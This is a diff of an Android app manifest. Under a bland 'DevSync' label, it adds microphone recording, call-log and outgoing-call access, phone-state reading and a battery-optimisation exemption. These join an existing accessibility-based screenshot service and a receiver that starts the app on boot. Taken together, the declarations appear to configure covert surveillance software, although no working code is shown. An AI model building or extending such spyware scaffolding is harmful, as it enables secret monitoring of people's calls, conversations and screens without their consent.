@@ -1,69 +1,82 @@
 <?xml version="1.0" encoding="utf-8"?>
-  <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-      <uses-permission android:name="android.permission.INTERNET" />
-      <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-      <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-      <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-      <uses-permission android:name="android.permission.SET_WALLPAPER" />
-      <uses-permission android:name="android.permission.BLUETOOTH" />
-      <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-      <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-      <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
-      <application
-          android:allowBackup="true"
-          android:icon="@drawable/ic_launcher"
-          android:label="@string/app_name"
-          android:roundIcon="@drawable/ic_launcher"
-          android:supportsRtl="true"
-          android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
-          android:usesCleartextTraffic="true">
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@drawable/ic_launcher"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
+        android:usesCleartextTraffic="true">
 
-          <activity
-              android:name=".MainActivity"
-              android:exported="true">
-              <intent-filter>
-                  <action android:name="android.intent.action.MAIN" />
-                  <category android:name="android.intent.category.LAUNCHER" />
-              </intent-filter>
-          </activity>
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
-          <activity
-              android:name=".AdminControlActivity"
-              android:exported="false" />
+        <activity
+            android:name=".AdminControlActivity"
+            android:exported="false" />
 
-          <activity
-              android:name=".UserInterfaceActivity"
-              android:exported="false" />
+        <activity
+            android:name=".UserInterfaceActivity"
+            android:exported="false" />
 
-          <service
-              android:name=".DeviceSyncService"
-              android:enabled="true"
-              android:exported="false"
-              android:foregroundServiceType="dataSync" />
+        <service
+            android:name=".DeviceSyncService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
 
-          <service
-              android:name=".ScreenshotService"
-              android:exported="true"
-              android:label="DevSync Screenshot"
-              android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-              <intent-filter>
-                  <action android:name="android.accessibilityservice.AccessibilityService" />
-              </intent-filter>
-              <meta-data
-                  android:name="android.accessibilityservice"
-                  android:resource="@xml/accessibility_service_config" />
-          </service>
+        <service
+            android:name=".RecordingService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
 
-          <receiver
-              android:name=".BootReceiver"
-              android:enabled="true"
-              android:exported="true">
-              <intent-filter>
-                  <action android:name="android.intent.action.BOOT_COMPLETED" />
-              </intent-filter>
-          </receiver>
+        <service
+            android:name=".ScreenshotService"
+            android:exported="true"
+            android:label="DevSync Screenshot"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
-      </application>
-  </manifest>
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
